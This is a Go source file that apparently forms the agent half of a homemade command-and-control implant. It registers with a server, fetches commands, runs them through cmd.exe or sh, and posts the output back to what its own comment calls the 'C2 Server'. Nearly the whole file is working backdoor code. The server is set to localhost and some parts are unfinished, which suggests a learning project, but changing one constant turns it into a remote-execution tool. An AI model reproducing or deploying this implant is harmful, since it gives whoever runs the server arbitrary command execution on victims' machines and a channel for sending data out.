package utils

import (
	"bytes"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os/exec"
	"runtime"
)

const BASE_URL = "http://127.0.0.1:8000"

func DataCollection() string {
	// For now OS -> Then exec type, env, etc..
	return runtime.GOOS
}

func GetAgentId() string {
	resp, err := http.Post(BASE_URL+"/connect", "", nil)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	type Response struct {
		Token string `json:"agent_id"`
	}

	var result Response
	err = json.Unmarshal(body, &result)
	if err != nil {
		log.Fatalln(err)
	}

	log.Printf(result.Token)
	return result.Token
}

func GetCommand(agentId string) {

	/***
		type DataSend struct {
			AgentId string `json:"agent_id"`
		}

		dataSend := DataSend{AgentId: agentId}

		data, err := json.Marshal(dataSend)
		if err != nil {
			log.Fatalln(err)
		}
	    ***/

	resp, err := http.Post(BASE_URL+"/cmd/"+agentId, "application/json", nil)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	type Response struct {
		Task_id string `json:"task_id"`
		Command string `json:"command"`
	}

	var result Response
	err = json.Unmarshal(body, &result)
	if err != nil {
		log.Fatalln(err)
	}

	if result.Command == "" { // Crash protection
		log.Printf("No command - Exiting")
		return
	}

	// Execution de la commande
	var clientOs string
	clientOs = DataCollection() // Getting OS env

	var cmd *exec.Cmd

	if clientOs == "windows" {
		cmd = exec.Command("cmd.exe", "/C", result.Command)
	} else {
		cmd = exec.Command("sh", "-c", result.Command)
	}

	// Catch output instead of Stdout
	output, err := cmd.CombinedOutput() // stdout + sterrr
	if err != nil {
		log.Printf("Error exec : %s", err)
	}

	//log.Printf("Command OUTPUT : %s\n", string(output))
	log.Printf("Command successfully executed")

	// Enregistrement du résultat
	var toSend string
	var task_id string
	toSend = string(output)
	task_id = "2" // Need struc to gather it from pevious API call

	// Send to server -
	sendResult(agentId, toSend, task_id)

}

// Send Result to C2 Server
func sendResult(agentId string, output string, taskId string) bool {

	type DataSend struct {
		TaskId string `json:"task_id"`
		Stdout string `json:"stdout"`
		Stderr string `json:"stderr"`
	}

	dataSend := DataSend{TaskId: taskId, Stdout: output, Stderr: "None"}

	data, err := json.Marshal(dataSend)
	if err != nil {
		log.Fatalln(err)
	}

	resp, err := http.Post(BASE_URL+"/result/"+agentId, "application/json", bytes.NewBuffer(data))
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	type Response struct {
		Status string `json:"status"`
	}

	var result Response
	err = json.Unmarshal(body, &result)
	if err != nil {
		log.Fatalln(err)
	}

	log.Printf("Status %s\n", result.Status)
	return result.Status == "ok"

}

func die() {}
